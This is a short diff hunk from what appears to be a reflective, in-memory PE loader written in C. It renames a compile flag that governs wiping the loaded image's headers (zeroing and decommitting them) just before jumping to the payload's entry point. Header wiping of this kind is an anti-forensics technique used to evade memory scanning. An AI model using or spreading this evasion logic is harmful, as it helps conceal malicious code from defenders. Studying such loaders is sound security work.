@@ -206,20 +206,22 @@ static void ExecuteFromMemory(unsigned char* data) {
     // Execute entrypoint
     void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;
 
-#ifdef FREEMEM
-#ifdef WIPEHEADERS
-    #define MEM base
-#else
-    #define MEM data
-#endif // WIPEHEADERS
+#ifdef WIPEIMAGE
+    #ifdef WIPEHEADERS
+        #define MEM base
+    #else
+        #define MEM data
+    #endif // WIPEHEADERS
 
     PVOID memBase = MEM;
     SIZE_T memSize = nt->OptionalHeader.SizeOfHeaders;
-	
+
     NtProtectVirtualMemory((HANDLE)-1, &memBase, &memSize, PAGE_READWRITE, &oldProtect);
     RtlSecureZeroMemory(memBase, memSize);
     NtFreeVirtualMemory((HANDLE)-1, &memBase, &memSize, MEM_DECOMMIT);
-#endif // FREEMEM
+
+    #undef MEM
+#endif // WIPEIMAGE
 
     ((void(*)(void))entryPtr)();
 }
